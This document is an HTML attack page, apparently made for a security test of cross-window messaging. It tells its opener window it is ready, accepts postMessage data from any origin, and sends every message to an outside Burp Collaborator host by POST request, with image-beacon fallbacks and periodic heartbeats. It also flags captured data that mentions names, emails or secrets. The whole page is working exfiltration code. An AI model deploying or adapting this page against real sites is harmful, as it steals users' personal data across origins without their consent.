<!DOCTYPE html>
<html>
<head>
    <title>Collector</title>
    <style>
        body { 
            font-family: monospace; 
            background: #000; 
            color: #0f0; 
            padding: 20px; 
        }
        #log { 
            max-height: 80vh; 
            overflow: auto; 
            border: 1px solid #0f0; 
            padding: 10px; 
        }
    </style>
</head>
<body>
<h2>Data Collector Active</h2>
<div id="status">Waiting for data...</div>
<hr>
<div id="log"></div>

<script>
const EXFIL = '8enpds891mi66ld8hc42ougriio9c50u.oastify.com';
const log = document.getElementById('log');
const status = document.getElementById('status');
let count = 0;

function addLog(msg) {
    count++;
    const time = new Date().toLocaleTimeString();
    log.innerHTML = `[${time}] ${msg}<br>` + log.innerHTML;
    
    // Also send to Burp
    new Image().src = `https://${EXFIL}/?collector_log=${encodeURIComponent(msg)}`;
}

addLog('âœ“ Collector page loaded');

// Check if we have opener
if (window.opener) {
    addLog('âœ“ Has opener window');
    
    // Tell opener we're ready
    window.opener.postMessage({type: 'COLLECTOR_READY'}, '*');
    addLog('âœ“ Sent ready message to opener');
} else {
    addLog('âœ— NO OPENER - opened directly?');
}

// Listen for ALL messages
window.addEventListener('message', function(e) {
    count++;
    
    addLog(`ðŸ“¨ Message #${count} from: ${e.origin}`);
    
    const dataStr = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
    
    // Show preview
    addLog(`Preview: ${dataStr.substring(0, 150)}`);
    
    // Update status
    status.textContent = `Received ${count} messages`;
    
    // Exfiltrate EVERYTHING
    fetch(`https://${EXFIL}/msg_${count}`, {
        method: 'POST',
        mode: 'cors',
        headers: {'Content-Type': 'text/plain'},
        body: dataStr
    }).then(() => {
        addLog(`âœ“ Sent to Burp: msg_${count}`);
    }).catch(err => {
        addLog(`âœ— Fetch failed: ${err.message}`);
        
        // Fallback to image beacon
        new Image().src = `https://${EXFIL}/?fallback_${count}=${encodeURIComponent(dataStr.substring(0, 500))}`;
    });
    
    // Check for interesting data
    const interesting = ['46962361', 'firstname', 'super_secret', 'contact', 'email'];
    if (interesting.some(keyword => dataStr.toLowerCase().includes(keyword))) {
        addLog(`ðŸš¨ INTERESTING DATA DETECTED!`);
        status.style.background = '#f00';
        status.style.color = '#fff';
    }
});

// Periodic heartbeat
setInterval(() => {
    new Image().src = `https://${EXFIL}/?heartbeat=${count}`;
    addLog(`ðŸ’“ Heartbeat - ${count} messages collected`);
}, 10000);

addLog('âœ“ Listener active - waiting for data...');
</script>
</body>
</html>
